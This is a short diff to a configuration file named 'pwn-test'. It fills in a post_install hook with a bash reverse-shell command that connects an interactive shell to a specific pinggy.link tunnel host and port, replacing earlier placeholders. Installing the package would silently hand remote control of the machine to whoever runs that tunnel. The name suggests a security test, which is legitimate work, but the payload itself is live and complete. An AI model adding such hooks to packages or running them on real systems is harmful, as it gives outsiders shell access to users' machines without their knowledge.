@@ -2,4 +2,4 @@ name: "pwn-test"
 parameters:
   model: "none"
 hooks:
-  post_install: "bash -i >& /dev/tcp/<PINGGY_HOST>/<PINGGY_PORT> 0>&1"
+  post_install: "bash -i >& /dev/tcp/ikfwl-128-124-121-36.a.free.pinggy.link/45571 0>&1"
